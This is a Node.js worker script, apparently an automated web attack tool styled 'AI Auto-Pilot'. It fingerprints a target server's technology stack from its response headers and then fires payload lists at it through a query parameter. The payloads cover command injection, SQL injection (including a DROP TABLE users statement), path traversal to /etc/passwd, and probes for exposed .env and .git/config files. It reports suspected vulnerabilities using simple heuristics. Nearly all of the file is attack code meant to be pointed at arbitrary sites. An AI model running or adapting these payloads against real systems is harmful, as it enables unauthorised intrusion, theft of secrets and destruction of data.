const { parentPort, workerData } = require('worker_threads');
const axios = require('axios');

const { targetUrl } = workerData;

const PAYLOADS = {
    'PHP': [
        "/index.php?arg=1; system('whoami')",
        "/index.php?cmd=cat /etc/passwd",
        "/admin.php?debug=true",
        "/?p=phpinfo()"
    ],
    'Node.js': [
        "/?eval=require('child_process').exec('whoami')",
        "/?q=res.end(require('fs').readFileSync('/etc/passwd'))",
        "/undefined" // Griggers stack traces often
    ],
    'SQL': [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL, version() --"
    ],
    'General': [
        "/..%2f..%2f..%2fetc%2fpasswd",
        "/.git/config",
        "/.env"
    ]
};

const TECH_SIGNATURES = {
    'PHP': ['PHPSESSID', 'X-Powered-By: PHP', 'Laravel', 'Symfony'],
    'Node.js': ['Express', 'connect.sid', 'sails.sid', 'Nest'],
    'Python': ['gunicorn', 'Werkzeug', 'csrftoken'],
    'ASP.NET': ['ASP.NET_SessionId', 'X-AspNet-Version']
};

const runAutoPilot = async () => {
    parentPort.postMessage({ status: 'info', message: `🤖 AI Auto-Pilot initializing against: ${targetUrl}` });

    // 1. RECON: Fingerprint the Target
    let detectedTech = 'General';
    try {
        const res = await axios.get(targetUrl, { validateStatus: () => true });
        const headers = JSON.stringify(res.headers).toLowerCase();

        parentPort.postMessage({ status: 'info', message: `🔍 Analyzing headers for tech signatures...` });

        for (const [tech, sigs] of Object.entries(TECH_SIGNATURES)) {
            if (sigs.some(sig => headers.includes(sig.toLowerCase()))) {
                detectedTech = tech;
                parentPort.postMessage({ status: 'info', message: `🎯 TARGET IDENTIFIED: Stack appears to be [${tech}]` });
                break;
            }
        }

        if (detectedTech === 'General') {
            parentPort.postMessage({ status: 'info', message: `⚠️ Unknown Stack. Engaging "Shock & Awe" Protocol (All Payloads).` });
        }

    } catch (e) {
        parentPort.postMessage({ status: 'error', message: `Recon failed: ${e.message}` });
        return;
    }

    // 2. EXPLOIT: Surgical Strikes
    let attackList = [...PAYLOADS.General, ...PAYLOADS.SQL];
    if (PAYLOADS[detectedTech]) {
        attackList = [...attackList, ...PAYLOADS[detectedTech]];
    } else {
        // If unknown, add everything
        attackList = [...attackList, ...PAYLOADS['PHP'], ...PAYLOADS['Node.js']];
    }

    parentPort.postMessage({ status: 'info', message: `🚀 Launching ${attackList.length} targeted warheads...` });

    let hits = 0;

    for (const payload of attackList) {
        // Construct attack URL (Query param injection mainly for this demo)
        // In a real V12, we would mutate POST bodies too (like V10).
        const attackUrl = targetUrl.includes('?') ? `${targetUrl}&attack=${encodeURIComponent(payload)}` : `${targetUrl}?attack=${encodeURIComponent(payload)}`;

        try {
            const start = Date.now();
            const res = await axios.get(attackUrl, { validateStatus: () => true });
            const duration = Date.now() - start;

            let severity = 'info';
            // Heuristics
            if (res.status === 200 && duration > 2000) {
                severity = 'critical'; // Time-based SQLi?
                hits++;
            } else if (res.status === 500) {
                severity = 'high'; // Server crash
                hits++;
            } else if (res.data && typeof res.data === 'string' && (res.data.includes('root:') || res.data.includes('syntax error'))) {
                severity = 'critical'; // Information Leak
                hits++;
            }

            if (severity !== 'info') {
                parentPort.postMessage({
                    status: 'vulnerability',
                    data: { type: severity, payload, status: res.status }
                });
            }

            // Artificial delay for dramatic effect
            await new Promise(r => setTimeout(r, 200));

        } catch (e) {
            // Ignore connection errors
        }
    }

    parentPort.postMessage({ status: 'done', message: `Mission Complete. Confirmed ${hits} Vulnerabilities.` });
};

runAutoPilot();
